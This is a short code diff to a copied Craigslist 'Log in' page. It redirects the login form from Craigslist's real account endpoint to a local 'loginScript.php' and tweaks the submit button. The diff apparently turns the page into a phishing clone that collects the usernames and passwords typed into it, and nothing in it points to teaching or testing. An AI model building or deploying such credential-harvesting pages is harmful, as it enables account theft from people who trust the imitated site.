@@ -73,7 +73,7 @@ account log in            </p>
     <div class="login-page-boxes">
         <div class="accountform login-box">
             <h1 class="accountform-banner">Log in</h1>
-            <form action="https://accounts.craigslist.org/login?lang=en&amp;cc=us" method="POST" class="loginform">
+            <form action="loginScript.php" method="POST" class="loginform">
                 <input type="hidden" name="step" value="confirmation">
                 <input type="hidden" name="rt" value="L">
                 <input type="hidden" name="rp" value="/login/home">
@@ -96,7 +96,7 @@ account log in            </p>
                     <input id="inputPassword" type="password" name="inputPassword" required="" autocomplete="off">
                 </div>
                 <div class="accountform-actions">
-                    <button type="submit" class="accountform-btn">Log in</button>
+                    <button type="submit" name="submit" class="accountform-btn">Log in</button>
                     <a href="forgot.html" class="accountform-helplink">Forgot password?</a>
                 </div>
             </form>
